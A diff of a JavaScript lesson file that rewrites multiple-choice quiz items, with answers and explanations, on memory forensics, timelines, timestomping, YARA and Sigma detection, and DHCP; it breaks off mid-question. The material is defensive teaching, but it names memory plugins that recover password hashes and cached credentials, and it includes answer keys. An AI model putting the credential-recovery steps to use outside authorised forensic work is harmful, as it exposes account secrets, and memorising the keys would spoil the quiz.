+        "question": "A process named svchost.exe has the expected PID and command line, but windows.vadinfo shows its base executable region does not match the real svchost.exe on disk, and malfind flags an unbacked executable region at that base address. Which technique does this most likely indicate?",
         "options": [
           {
-            "label": "Process hollowing (T1055.012): the process's own legitimate code was unmapped and replaced entirely, unlike DLL injection, which adds malicious code alongside code that is still present.",
+            "label": "Process hollowing: svchost.exe's own code was unmapped and replaced, so its in-memory image no longer matches the file.",
             "value": "a"
           },
           {
-            "label": "Simple DLL injection, because any executable-region mismatch found by vadinfo always indicates a DLL was loaded into a process via LoadLibrary.",
+            "label": "Classic LoadLibrary DLL injection: a malicious DLL was loaded alongside svchost.exe's legitimate code from disk.",
             "value": "b"
           },
           {
-            "label": "A corrupted memory image, since a legitimate process's base region can never differ from its file on disk under any circumstance.",
+            "label": "A process unlinked from the active list to hide, which is why its base region no longer matches the file on disk.",
             "value": "c"
           },
           {
-            "label": "Normal ASLR (Address Space Layout Randomization) behavior, which is expected to make every process's base region differ from its file on disk.",
+            "label": "Normal ASLR behaviour, which loads each process at a random address so its base region differs from the file.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Process hollowing launches a legitimate process suspended, unmaps its real code, writes malicious code into the freed space, and resumes it — so the process keeps the trusted name/PID/command line while its actual in-memory image no longer matches the on-disk file, which is exactly what vadinfo and malfind are catching here. This differs from DLL injection (T1055.001), where the legitimate code remains and malicious code is added alongside it. The simple DLL injection option misapplies DLL injection's mechanism to this evidence. The corrupted memory image option wrongly assumes any mismatch means corruption rather than a known technique. The ASLR option confuses ASLR (address randomization) with a code-content mismatch, which ASLR does not cause."
+        "explanation": "In process hollowing (T1055.012), a legitimate process is started suspended, its real code is unmapped and replaced, and it is resumed, so it keeps a trusted name, PID and command line while the image at its base no longer matches the file it claims to be. \"Classic LoadLibrary DLL injection\" is wrong: the injected DLL is file-backed and is added beside intact original code, so it shows up in dlllist/ldrmodules, not as a replaced base image. \"A process unlinked from the active list\" is wrong: unlinking hides a process from pslist but does not change the code at its base address, and this process is visible with its expected PID. \"Normal ASLR behaviour\" is wrong: ASLR changes where an image is loaded, not what the loaded code contains."
       },
       {
-        "question": "After malfind and netscan confirm an attacker had code running on a workstation, you want to know which local and cached credentials that attacker could have harvested from RAM, so you know what to reset. Which Volatility 3 plugins directly answer this?",
+        "question": "After malfind and netscan confirm an attacker had code running on a workstation, you want to know which local and cached credentials could have been harvested from RAM, so you know what to reset. Which Volatility 3 plugins directly answer this?",
         "options": [
           {
-            "label": "windows.hashdump, windows.lsadump, and windows.cachedump, which recover local NTLM hashes, LSA secrets, and domain cached credentials from the memory image respectively.",
+            "label": "windows.hashdump, lsadump and cachedump: local NTLM hashes, LSA secrets and domain cached logons.",
             "value": "a"
           },
           {
-            "label": "windows.pstree alone, because the process tree by itself lists every account password in cleartext next to the process that owned it.",
+            "label": "windows.lsadump alone, since LSA secrets include every local hash and cached domain logon on the host.",
             "value": "b"
           },
           {
-            "label": "windows.info, since identifying the OS build is the only step ever needed to enumerate and export all stored credentials automatically.",
+            "label": "windows.handles on lsass.exe, since its open handles list the credentials it was holding at capture.",
             "value": "c"
           },
           {
-            "label": "windows.netscan, because network connections inherently contain the full set of local and cached account passwords as part of each packet header.",
+            "label": "windows.registry.hivelist, since listing the SAM and SECURITY hives in memory shows their passwords.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "windows.hashdump pulls local NTLM hashes from SAM data, windows.lsadump pulls LSA secrets (including some cleartext service passwords), and windows.cachedump pulls domain cached credentials — together scoping exactly which credentials an attacker on the host could have stolen from memory. The windows.pstree option is wrong because pstree lists processes, not passwords. The windows.info option is wrong because windows.info only identifies the build. The windows.netscan option is wrong because network connections do not carry account passwords in their headers."
+        "explanation": "The three plugins cover the three credential stores: windows.hashdump recovers local NTLM hashes from SAM data, windows.lsadump recovers LSA secrets such as service-account passwords, and windows.cachedump recovers domain cached credentials. Together they scope what to reset. \"windows.lsadump alone\" is wrong: LSA secrets are one store; local hashes come from hashdump and cached domain logons from cachedump. \"windows.handles on lsass.exe\" is wrong: handles list the objects a process has open, not the secrets held in its memory. \"windows.registry.hivelist\" is wrong: it lists which hives are loaded and their offsets, not the values inside them."
       }
     ],
     "references": [
@@ -8543,119 +8589,119 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "You are building a timeline from a Windows event log (recorded in local time, UTC+2) and a cloud service log (recorded in UTC). Why must you normalise these before ordering events, and what goes wrong if you do not?",
+        "question": "A Windows event log exported in local time (UTC+2) shows powershell.exe launching at 16:06:10. A cloud sign-in log, recorded in UTC, shows a suspicious sign-in for the same user at 14:30:00. After normalising both to UTC, which statement is correct?",
         "options": [
           {
-            "label": "Normalisation is unnecessary, because all digital timestamps are automatically stored in the same universal format regardless of the source that produced them.",
+            "label": "The sign-in came first, about 1.5 hours before PowerShell, so the sign-in likely led to the launch.",
             "value": "a"
           },
           {
-            "label": "Without converting both to one reference like UTC, events will be mis-ordered, so an effect can appear to precede its cause and the reconstruction becomes false.",
+            "label": "PowerShell came first, at 14:06:10 UTC, about 24 minutes before the 14:30:00 UTC sign-in.",
             "value": "b"
           },
           {
-            "label": "You only need to normalise if the two logs are more than 24 hours apart; within the same day, mixing local time and UTC has no effect on event ordering.",
+            "label": "The sign-in came first: PowerShell ran at 18:06:10 UTC, about 3.5 hours after the sign-in.",
             "value": "c"
           },
           {
-            "label": "Normalisation matters only for the display colours in the timeline tool and never changes the actual chronological order the events are placed in.",
+            "label": "The order cannot be judged, since a two-hour offset is within normal clock drift between hosts.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Timestamps are meaningless without their time zone, so mixing local-time (UTC+2) and UTC events without normalising will mis-order them — a two-hour offset can make an effect appear before its cause and produce a confidently wrong reconstruction; the fix is converting everything to one reference, usually UTC. The 'normalisation is unnecessary' option is false because sources record time differently (local vs UTC). The 'only if more than 24 hours apart' option is wrong because even a small offset mis-orders events within a day. The 'display colours' option trivialises normalisation, which directly affects ordering, not just display."
+        "explanation": "UTC+2 is two hours ahead of UTC, so 16:06:10 local is 14:06:10 UTC. That puts the PowerShell launch about 24 minutes before the 14:30:00 UTC sign-in, which is the opposite of what the raw times suggest. \"The sign-in came first, about 1.5 hours before PowerShell\" is the classic un-normalised reading: it compares 16:06 local with 14:30 UTC directly, which makes the effect appear to precede the cause. \"PowerShell ran at 18:06:10 UTC\" adds the offset instead of subtracting it. \"Within normal clock drift\" is wrong: drift from unsynchronised clocks is typically seconds or minutes, while a time-zone offset is a known, whole-hour value you correct for."
       },
       {
-        "question": "A suspected malicious executable shows a creation timestamp of 2019 in $STANDARD_INFORMATION, but its $FILE_NAME timestamp shows it appeared last week. What does this discrepancy most likely indicate?",
+        "question": "MFTECmd shows evil.ps1 in C:\\Users\\Public with SI Created 2019-03-11 10:02:00 UTC but FN Created 2026-08-14 14:05:02 UTC, inside your intrusion window. What does this discrepancy most likely indicate?",
         "options": [
           {
-            "label": "A normal Windows update, because the operating system routinely rewrites $STANDARD_INFORMATION to a date years in the past whenever it patches a file.",
+            "label": "Ordinary copying: copied files keep an old Modified time, so an old date beside a recent one is expected.",
             "value": "a"
           },
           {
-            "label": "Timestomping: the attacker backdated the easily-changed $STANDARD_INFORMATION times but not the harder-to-alter $FILE_NAME times, exposing the tampering.",
+            "label": "Timestomping: the easily changed $STANDARD_INFORMATION times were backdated, but $FILE_NAME kept the real date.",
             "value": "b"
           },
           {
-            "label": "A corrupted disk, because the only way the two NTFS timestamp structures can ever differ is physical damage to the drive storing the file.",
+            "label": "Clock drift: the host's clock was wrong when one structure was written, so both dates need a skew correction.",
             "value": "c"
           },
           {
-            "label": "Nothing suspicious, because $STANDARD_INFORMATION and $FILE_NAME are copies that Windows keeps perfectly identical, so any tool reading them made an error.",
+            "label": "Reverse timestomping: $FILE_NAME was altered to move an old file into the window, so 2019 is the true date.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Most timestomping tools alter the easily-changed $STANDARD_INFORMATION timestamps but not the harder-to-modify $FILE_NAME ones, so a 2019 $STANDARD_INFORMATION time against a last-week $FILE_NAME time is a classic signature of backdating (MITRE Indicator Removal: Timestomp). The Windows-update option invents update behaviour that does not backdate files years into the past. The corrupted-disk option is wrong because the two structures legitimately differ by design and mismatch here signals tampering, not disk damage. The 'nothing suspicious' option is false because the two are distinct structures, not kept identical."
+        "explanation": "Most timestomping tools change the $STANDARD_INFORMATION (SI) times but not the harder-to-alter $FILE_NAME (FN) times, so an SI creation date in 2019 against an FN creation date inside the intrusion window is the classic sign of backdating (T1070.006). \"Ordinary copying\" is wrong: copying keeps an old Modified time while setting a new Created time; it explains Modified being earlier than Created, not the two structures disagreeing about the Created time. \"Clock drift\" is wrong: drift is seconds or minutes, not seven years, and it would affect both structures alike. \"Reverse timestomping\" is wrong: FN is the structure normal software has trouble changing, so it is the one to trust, and the FN date matches the intrusion."
       },
       {
-        "question": "You run log2timeline and psort on a full disk image and get a CSV with three million rows. What is the correct approach to actually use it to investigate a specific EDR alert that fired at 14:06:10 UTC?",
+        "question": "You run log2timeline and psort on a full disk image and get a CSV with three million rows. What is the correct way to use it to investigate an EDR alert that fired at 14:06:10 UTC?",
         "options": [
           {
-            "label": "Read all three million rows in order from the very beginning of the file, since skipping any rows risks missing evidence relevant to the alert.",
+            "label": "Keep only the event-log rows from the alerting host, since the other sources mostly add noise around the alert.",
             "value": "a"
           },
           {
-            "label": "Discard the super-timeline as too large to be useful and rely only on the single EDR alert with no further correlation from other sources.",
+            "label": "Sort by the MACB column and review only the rows where all four flags fired at the same instant on any file.",
             "value": "b"
           },
           {
-            "label": "Anchor on the 14:06:10 alert as a trusted pivot, filter the timeline to a tight window around it, read that window fully, then widen or refilter as new leads appear.",
+            "label": "Anchor on the 14:06:10 alert, filter to a tight window around it, read it fully, then widen as new leads appear.",
             "value": "c"
           },
           {
-            "label": "Sort the timeline alphabetically by filename instead of by time, since chronological order is not useful once a super-timeline exceeds one million rows.",
+            "label": "Re-run log2timeline with only the winevtx parser, so the new timeline is small enough to read in full.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "The core technique for a large super-timeline is to anchor on a trusted pivot event and window tightly around it in a viewer like Timeline Explorer, reading that narrow slice fully and expanding outward as new leads (filenames, IPs, usernames) emerge. Reading all three million rows is impractical and defeats the purpose of filtering. Relying only on the single EDR alert throws away the correlating power of the super-timeline entirely. Sorting alphabetically by filename abandons chronological order, which is the entire point of a timeline."
+        "explanation": "The core technique is anchor and window: take a trusted pivot (the EDR alert time), filter to a tight window around it, read that slice in full, then widen or filter on new leads such as filenames, IPs or usernames. \"Keep only the event-log rows\" is wrong: it throws away the cross-source view (MFT, registry, Prefetch) that is the reason to build a super-timeline. \"Review only the rows where all four flags fired\" is wrong: MACB flags describe which timestamps a row stands for; they say nothing about malice, and the attacker's events may be any mix of M, A, C or B. \"Re-run log2timeline with only the winevtx parser\" is wrong: it repeats a long extraction and drops every non-event-log source, while a time-window filter on the existing output gets you there directly."
       },
       {
-        "question": "You run `fls -m C: -r` against a disk image and pipe the output into a file, then run `mactime -b` against that file. What is the bodyfile, and what does mactime do with it?",
+        "question": "You run `fls -m C: -r` against a disk image, redirect the output to bodyfile.txt, then run `mactime -b bodyfile.txt -d`. What is the bodyfile, and what does mactime do with it?",
         "options": [
           {
-            "label": "The bodyfile is a pipe-delimited intermediate file (one line per file, with MACB timestamps as raw epoch values) that mactime sorts and renders into a readable timeline.",
+            "label": "An intermediate pipe-delimited text file, one line per file with raw epoch MACB values, that mactime sorts into a timeline.",
             "value": "a"
           },
           {
-            "label": "The bodyfile is the final human-readable timeline output itself, and mactime only compresses it for storage without changing its content.",
+            "label": "The Plaso storage file for a file-system-only run, which mactime renders in the same way psort renders a .plaso store.",
             "value": "b"
           },
           {
-            "label": "The bodyfile is a binary Plaso storage file, and mactime is simply an older, deprecated alias for the psort command.",
+            "label": "A finished timeline with one row per timestamp event, which mactime cuts down to the time window you pass with -b.",
             "value": "c"
           },
           {
-            "label": "The bodyfile only contains registry and event log data, never file-system timestamps, which is why fls is required to add MACB information separately.",
+            "label": "A list of each file's $FILE_NAME times only, which mactime merges with $STANDARD_INFORMATION to flag timestomping.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "fls produces a plain-text, pipe-delimited bodyfile with one line per file — including its MD5, path, inode, permissions, and raw epoch MACB timestamps — and mactime reads that bodyfile, sorts every timestamp chronologically, and renders it as a human-readable timeline. The 'final human-readable timeline' option is wrong because the bodyfile is an intermediate format, not the final readable output. The Plaso storage file option confuses this Sleuth Kit workflow with the separate Plaso/log2timeline toolchain. The 'registry and event log data only' option is wrong because the bodyfile format is specifically about file-system MACB timestamps, not registry or event log data."
+        "explanation": "fls writes a plain-text, pipe-delimited bodyfile with one line per file (MD5, path, inode, mode, UID, GID, size, then atime, mtime, ctime and crtime as raw epoch values); mactime reads it with -b, sorts every timestamp and renders one row per timestamp event, labelled with its MACB flags. \"The Plaso storage file\" is wrong: the .plaso store belongs to the separate log2timeline/psort toolchain; the bodyfile is The Sleuth Kit's plain-text format. \"A finished timeline ... -b\" is wrong: the bodyfile is not human-readable yet, and -b tells mactime which bodyfile to read, not a time window. \"$FILE_NAME times only\" is wrong: each line carries the file's four MACB timestamps, and mactime sorts them; it does not compare structures to detect timestomping."
       },
       {
-        "question": "After building the super-timeline you run psort with the dynamic output module and want only registry events near your pivot. Which command fragment does that, and why is filtering at the psort stage useful?",
+        "question": "You already built case01.plaso from a full disk image and now want a CSV of only registry events for persistence hunting. Which command is the efficient way to get it?",
         "options": [
           {
-            "label": "psort.py -o dynamic ... \"parser is 'winreg'\" — psort filters at render time, writing only registry rows instead of exporting millions to filter later.",
+            "label": "psort.py -o dynamic -w reg.csv case01.plaso \"parser is 'winreg'\", filtering the existing store as it writes",
             "value": "a"
           },
           {
-            "label": "log2timeline.py --only-registry — extraction itself drops every non-registry artifact permanently.",
+            "label": "log2timeline.py --parsers winreg --storage-file reg.plaso on the image, so only registry data is extracted",
             "value": "b"
           },
           {
-            "label": "mactime -b bodyfile -registry — the bodyfile format has a dedicated registry-only mode.",
+            "label": "mactime -b bodyfile.txt -d with a registry filter, since the bodyfile holds each key's last-write time",
             "value": "c"
           },
           {
-            "label": "Timeline Explorer is the only place filtering can happen; psort always writes every row.",
+            "label": "psort.py -o null case01.plaso \"parser is 'winreg'\", so that only the matching registry rows are written",
             "value": "d"
           }
         ],
-        "explanation": "psort.py accepts an event filter expression as its final argument (fields like parser, date, message combined with AND/OR/contains/is), so you can narrow output at render time — e.g. \"parser is 'winreg'\" for registry-only rows — rather than exporting the entire store first.",
-        "answer": "a"
+        "answer": "a",
+        "explanation": "psort accepts an event filter expression as its final argument, so \"parser is 'winreg'\" renders only registry rows from the store you already have, with no re-extraction and no need to export millions of rows first. \"log2timeline.py --parsers winreg\" is valid syntax, but it re-parses the whole image to build a new store, which is far slower than filtering the existing one. \"mactime -b bodyfile.txt\" is wrong: a bodyfile holds file-system MACB timestamps only, not registry keys. \"psort.py -o null\" is wrong: the null output module discards its output, so no CSV is written at all."
       }
     ],
     "references": [
@@ -8734,116 +8780,162 @@ const NEW_TOPIC_LESSONS = [
         "question": "Why can a single well-written YARA rule detect many variants of a malware family, whereas a SHA-256 file hash cannot?",
         "options": [
           {
-            "label": "A YARA rule matches on content patterns (strings and byte sequences), so it still fires on variants, while a hash identifies one exact file and changes completely if a single byte differs.",
+            "label": "A rule matches content patterns variants share; a hash fingerprints one exact file and changes if any byte does.",
             "value": "a"
           },
           {
-            "label": "A YARA rule and a file hash work identically, but YARA rules are simply computed faster, which is the only practical advantage YARA offers over hashing.",
+            "label": "A hash tolerates small edits such as a new URL, but it breaks once the malware is recompiled for a new target.",
             "value": "b"
           },
           {
-            "label": "A SHA-256 hash matches any file in the same malware family automatically, so YARA is only needed when the malware has no hash value at all.",
+            "label": "A rule scores a file’s overall similarity to a stored sample, so near-identical variants score high enough.",
             "value": "c"
           },
           {
-            "label": "A YARA rule works by storing the full original malware sample inside the rule, so it can only ever match that one identical file and nothing else.",
+            "label": "A rule matches the file name and install path that variants usually reuse, while a hash reads the content.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A YARA rule matches on content patterns — distinctive strings and byte sequences — so it can catch related variants that share those patterns, whereas a SHA-256 hash fingerprints one exact file and changes entirely if even a single byte is altered, missing trivially modified variants. The claim that YARA and hashes work identically is wrong because they do not work identically; the difference is pattern-matching vs exact-file matching. The claim that a hash matches a whole family is false because a hash matches only one exact file, not a family. The claim that YARA stores the full sample misdescribes YARA, which stores patterns, not the whole sample."
+        "explanation": "A YARA rule matches distinctive strings, byte sequences and structural facts, so it fires on any variant that still contains them, while a SHA-256 hash fingerprints one exact file and changes completely if a single byte changes. The “tolerates small edits” option is wrong because a cryptographic hash changes with any edit, including a new URL. The similarity-score option misdescribes YARA: a rule stores patterns and a boolean condition, not a sample to compare against. The file-name option is wrong because YARA matches the content of files, processes and memory, not their names or paths."
       },
       {
         "question": "An analyst writes a YARA rule whose only string is the Windows API name \"CreateProcessA\", which appears in thousands of legitimate programs. What is the likely problem, and what is the better approach?",
         "options": [
           {
-            "label": "The rule is too narrow and will miss variants; the fix is to remove the condition section entirely so the rule matches every file it scans.",
+            "label": "Too narrow: add `nocase` and `wide` so the API name also matches other casings and text encodings.",
             "value": "a"
           },
           {
-            "label": "The rule is too broad and will cause many false positives; combine multiple distinctive indicators and anchor on patterns hard for the attacker to change.",
+            "label": "Too broad: require several distinctive indicators together, anchored on what attackers can’t easily change.",
             "value": "b"
           },
           {
-            "label": "The rule is perfectly tuned, because matching a common API name guarantees it will detect the malware family without ever flagging any benign software.",
+            "label": "Too broad: add `fullword` to the string so it stops matching benign programs’ use of CreateProcessA.",
             "value": "c"
           },
           {
-            "label": "The problem is only performance; the rule is accurate but slow, so the fix is simply to run it on fewer files rather than changing its logic at all.",
+            "label": "Acceptable once `filesize < 500KB` is added, since that size limit filters out the benign programs.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Keying a rule on a common API name that appears in thousands of legitimate programs makes it too broad, producing many false positives that bury analysts; the better approach is to combine multiple distinctive indicators and anchor on patterns the attacker cannot easily change, tuning specificity without becoming brittle. The 'too narrow' option misdiagnoses it as too narrow and suggests removing the condition, which would match everything. The 'perfectly tuned' option is wrong because a common string flags benign software. The 'only performance' option misframes a false-positive (accuracy) problem as merely performance."
+        "explanation": "A string that appears in thousands of legitimate programs makes the rule too broad and buries analysts in false positives; the fix the lesson teaches is to combine multiple distinctive indicators and anchor on patterns the attacker cannot easily change. Adding `nocase` and `wide` widens the match further, the opposite of what is needed. `fullword` only stops the string matching inside a longer word; CreateProcessA is already a whole token in every benign program that uses it. A size ceiling removes large files, but countless small legitimate programs still import CreateProcessA."
       },
       {
-        "question": "You run `yara -r Suspicious_Downloader.yar C:\\Endpoints\\` against a suspected packed malware sample and get no output at all, even though the analyst who wrote the rule confirmed it matches the same family's unpacked code. What is the most likely explanation, and what should you try next?",
+        "question": "You run `yara -s Suspicious_Downloader.yar sample.exe` and get no output at all. The rule’s author confirmed it matches this family’s unpacked code. The sample’s sections have entropy close to 7.9 and its import table lists only two functions. What is the most likely explanation, and what should you try next?",
         "options": [
           {
-            "label": "No output always means the yara tool has crashed silently, so the fix is simply to re-run the exact same scan again on the same disk file until it eventually reports a match.",
+            "label": "The rule failed to compile, since YARA prints nothing when a rule file has a syntax error; fix the rule.",
             "value": "a"
           },
           {
-            "label": "The sample is likely packed or encrypted on disk, hiding its strings until runtime; try scanning a memory image of a running/unpacked instance instead of the static file.",
+            "label": "The file is likely packed, hiding its strings on disk; scan a memory image of the running process instead.",
             "value": "b"
           },
           {
-            "label": "No output proves conclusively that this endpoint has zero malware of any kind, so no further scanning or investigation of this host is warranted.",
+            "label": "The scan is clean, so this file is not that malware family and the investigation of the host can be closed.",
             "value": "c"
           },
           {
-            "label": "The rule's meta section must be missing required fields, since YARA silently refuses to report any matches for rules that lack an author or description.",
+            "label": "The `-s` flag hides strings that did not match, so drop it and re-run the scan to see the partial matches.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Packed or encrypted malware hides its real strings/code on disk and only reveals them once unpacked at runtime, so a rule built from unpacked strings can produce zero matches against the static packed file; scanning a memory image, where the code has unpacked itself to execute, often recovers the visible strings the static scan missed. The silent-crash option wrongly assumes silence means a crash. The 'zero malware' option overstates what a single static YARA scan (within its known limits) can prove. The missing-meta-fields option invents a meta requirement that has no bearing on whether content patterns match."
+        "explanation": "Entropy near 8 means the bytes look like random noise, which the lesson ties to packed or encrypted content; packed malware hides its real strings on disk and reveals them only when it unpacks in memory, so a rule built from unpacked code matches nothing in the static file, and scanning a memory image is the next step. A rule with a syntax error makes YARA report a compile error rather than stay silent. Treating the silence as a clean result ignores the packing evidence — a clean scan is evidence of absence only within YARA’s limits. The `-s` flag adds detail about strings that did match; with no rule match there is nothing for it to show either way."
       },
       {
         "question": "A rule uses `pe.imphash()` to match a known-bad value instead of matching on any text string in the file. Why might an analyst prefer this over string-only matching when trying to catch related malware variants?",
         "options": [
           {
-            "label": "Imphash summarises the file's import table (the external functions it calls), so different builds sharing the same toolchain and calls produce the same imphash even when embedded strings differ, making it more durable than an easily-edited string.",
+            "label": "It summarises the import table, which builds from one toolchain often share even when their strings differ.",
             "value": "a"
           },
           {
-            "label": "Imphash is a random number YARA generates purely for internal bookkeeping and carries no information about the file's imports, so it cannot actually be used to relate different builds to each other.",
+            "label": "It hashes the file’s embedded strings, so variants with the same strings share it even if their code differs.",
             "value": "b"
           },
           {
-            "label": "Imphash can only be computed after importing the math module and always represents an entropy score, meaning it detects packed files rather than anything about shared toolchains.",
+            "label": "It measures the file’s byte entropy, so it groups variants that were compressed with the same packer.",
             "value": "c"
           },
           {
-            "label": "Imphash always equals the file's full SHA256 hash, so relying on it is functionally identical to hashing the whole file and offers no advantage for catching variants.",
+            "label": "It is a fuzzy hash of the whole file, so variants that differ by a few bytes still produce the same value.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The pe module's imphash() is an MD5 of the PE's normalised import table; because malware variants from the same toolchain often call the same external functions in the same order, they frequently share an imphash even when their embedded strings or overall hash differ — making it a durable, family-level indicator. The 'random bookkeeping number' option wrongly claims it carries no information. The math-module entropy option confuses it with the unrelated math module's entropy function. The 'equals the full SHA256' option wrongly equates it with a full-file hash, which is exactly the exact-match limitation imphash is meant to get around."
+        "explanation": "imphash is an MD5 of the PE’s normalised import table; variants built with the same toolchain often call the same external functions in the same order, so they share an imphash even when their strings and file hash differ — a durable, family-level indicator that survives cosmetic changes like new URLs. The embedded-strings option describes the opposite: imphash ignores strings, which is why it survives string edits. The entropy option confuses it with `math.entropy`, a different module. The fuzzy-hash option is wrong because imphash covers only the import table, not the whole file."
       },
       {
-        "question": "A malware family stores its C2 URL as UTF-16 (two bytes per character, as Windows often does), and some samples Base64-encode those same UTF-16 bytes into an ordinary ASCII config blob. How do you cover both forms in one rule?",
+        "question": "A malware family stores its C2 URL (written <url> below) as UTF-16 (two bytes per character, as Windows often does), and some samples Base64-encode those same UTF-16 bytes into an ordinary ASCII config blob. How do you cover both forms in one rule?",
         "options": [
           {
-            "label": "One string: $u = \"http://c2.example/gate\" wide base64wide — wide matches the UTF-16 form and base64wide matches the Base64-of-UTF-16 form from one definition.",
+            "label": "One string, `$u = \"<url>\" wide base64wide`, which covers the UTF-16 URL and its Base64 form at once.",
             "value": "a"
           },
           {
-            "label": "$u = \"http://c2.example/gate\" nocase fullword — case and word-boundary options change encoding.",
+            "label": "One string, `$u = \"<url>\" wide base64`, since the base64 modifier also keeps matching the plain text.",
             "value": "b"
           },
           {
-            "label": "$u = \"http://c2.example/gate\" xor — XOR encoding is the same thing as UTF-16 and Base64.",
+            "label": "One string, `$u = \"<url>\" wide xor`, since the xor modifier also covers encodings such as Base64.",
             "value": "c"
           },
           {
-            "label": "Two strings in the same rule: $u1 = \"http://c2.example/gate\" wide and $u2 = \"http://c2.example/gate\" wide base64, with a condition of any of them.",
+            "label": "Two strings, `$u1 = \"<url>\" wide` and `$u2 = \"<url>\" wide base64`, with a condition of any of them.",
             "value": "d"
           }
         ],
-        "explanation": "YARA applies wide/ascii first and the base64 modifiers after, and the base64 modifiers search only the encoded forms: the plaintext of the ascii or wide string is never included. So a single string with a base64 modifier cannot also match the plain UTF-16 URL; you need two strings in one rule. $u1 wide catches the raw UTF-16 URL, and $u2 wide base64 catches the Base64 encoding of those UTF-16 bytes written as ordinary ASCII text. The one-line 'wide base64wide' option fails twice: it drops the plaintext form, and base64wide looks for the Base64 text itself stored as UTF-16, which is not what an ASCII config blob holds. nocase and fullword do not change encoding, and xor is single-byte XOR obfuscation, unrelated to UTF-16 or Base64.",
+        "explanation": "YARA applies wide/ascii first and the base64 modifiers after, and the base64 modifiers search only the encoded forms — the plain ascii or wide string is never included. So a single string with a base64 modifier cannot also match the plain UTF-16 URL; you need two strings in one rule: $u1 wide catches the raw UTF-16 URL, and $u2 wide base64 catches the Base64 encoding of those UTF-16 bytes written as ordinary ASCII text. The `wide base64wide` option fails twice: it drops the plaintext form, and base64wide looks for the Base64 text itself stored as UTF-16, which is not what an ASCII config blob holds. The `wide base64` single string gets the encoded form right but still loses the plain UTF-16 URL. xor is single-byte XOR obfuscation, unrelated to Base64.",
         "answer": "d"
+      },
+      {
+        "question": "The lesson’s Multi_Indicator_Loader rule requires `filesize < 500KB and 3 of ($api1, $api2, $api3, $api4) and $marker in (entrypoint .. entrypoint + 200)`. A 300KB file contains $api1, $api2 and $api4, and $marker is found 450 bytes after the entry point. Does the rule match?",
+        "options": [
+          {
+            "label": "Yes, because three of the four API strings matched and the file is well under the 500KB limit.",
+            "value": "a"
+          },
+          {
+            "label": "No, because $marker lies outside the 200-byte range after the entry point that `in` requires.",
+            "value": "b"
+          },
+          {
+            "label": "No, because `3 of` needs the first three strings, $api1 to $api3, and $api3 is missing here.",
+            "value": "c"
+          },
+          {
+            "label": "Yes, because `in` checks that $marker appears somewhere after the entry point, at any distance.",
+            "value": "d"
+          }
+        ],
+        "answer": "b",
+        "explanation": "All three clauses are joined by `and`, so every one must be true. The size and `3 of` clauses pass, but `in (entrypoint .. entrypoint + 200)` restricts $marker to the first 200 bytes after the entry point, and it was found at +450, so the rule does not match. The “yes, three APIs” option forgets the third clause. The `3 of` option misreads the operator: it is true when any three of the listed strings matched, not a specific three. The “any distance” option misreads `in`, which bounds a match to the stated range."
+      },
+      {
+        "question": "After a phishing incident you want an analytic that flags winword.exe starting powershell.exe with an encoded command, using the process-creation events your endpoints already send to the SIEM. Which detection language fits this job?",
+        "options": [
+          {
+            "label": "YARA, scanning each endpoint’s files for the encoded PowerShell command as a text string.",
+            "value": "a"
+          },
+          {
+            "label": "Snort, matching the encoded command in the packets as the document opens on the endpoint.",
+            "value": "b"
+          },
+          {
+            "label": "Sigma, describing the parent, child and command-line fields of the process-creation event.",
+            "value": "c"
+          },
+          {
+            "label": "YARA with the pe module, checking which programs import the functions used to start PowerShell.",
+            "value": "d"
+          }
+        ],
+        "answer": "c",
+        "explanation": "The data is log events in a SIEM, and Sigma is the vendor-neutral format for detection logic over log fields — here the parent image, child image and command line — converted into the SIEM’s own query language. YARA operates on files, processes and memory, and a command line typed at launch is an event field, not file content on disk. Snort inspects packets on the wire; opening a document and starting a process happen on the host and do not cross the network as such. The pe-module option would flag huge numbers of legitimate programs that can start processes, and it still looks at files rather than the logged behaviour."
       }
     ],
     "references": [
@@ -8913,141 +9005,141 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A security alert reports suspicious outbound traffic from internal IP 10.4.2.17 at 02:14. To identify which physical machine actually held that address at that moment, which data source do you consult, and why is it necessary?",
+        "question": "An alert reports suspicious outbound traffic from internal IP 10.4.2.17 at 02:14 last night. You need to know which physical machine held that address at that moment. Which source answers this, and why?",
         "options": [
           {
-            "label": "The DNS server cache, because DNS permanently maps every internal IP address to a fixed physical device that never changes over time.",
+            "label": "The firewall log, since it records which device made each connection along with its source IP and port",
             "value": "a"
           },
           {
-            "label": "The DHCP lease log, because IP addresses are leased temporarily and reused, so you need the lease record tying that IP to a MAC/hostname at that time.",
+            "label": "The DHCP lease log, since IPs are leased and reused, and it ties the IP to a MAC and hostname at that time",
             "value": "b"
           },
           {
-            "label": "The firewall allow list, because it stores a permanent one-to-one assignment of every internal IP address to a named employee workstation.",
+            "label": "Running ipconfig /all on the machine that has 10.4.2.17 now, since it shows the address it was given",
             "value": "c"
           },
           {
-            "label": "No lookup is needed, because an internal IP address like 10.4.2.17 always belongs to the exact same device on every day of the year.",
+            "label": "A DNS lookup of 10.4.2.17, since DNS keeps a fixed record of which computer name owns each address",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "DHCP hands out IP addresses on temporary leases and reuses them, so an IP alone does not identify a device across time; the DHCP lease log records which MAC address and hostname held a given IP at a given moment, which is exactly the mapping you need. The DNS server cache option is wrong because DNS resolves names to IPs and does not permanently bind IPs to physical devices. The firewall allow list option misdescribes a firewall allow list. The 'no lookup is needed' option is false because leased IPs are reused across different devices."
+        "explanation": "DHCP hands out addresses on temporary leases and reuses them, so 10.4.2.17 may have been a different laptop at 02:14 than it is now. The lease log records which MAC address and hostname held the IP at each moment, which is exactly the mapping you need. A firewall log shows the IP address, not which physical machine was behind it. ipconfig on today’s holder only shows who has the address now. DNS maps names to addresses and is updated as leases change, so it is not a fixed, historical record of who owned the IP last night."
       },
       {
-        "question": "On a network you discover that two different servers are both responding to devices' DHCP Discover broadcasts with Offers, when only one authorised DHCP server should exist. Why is this a security concern?",
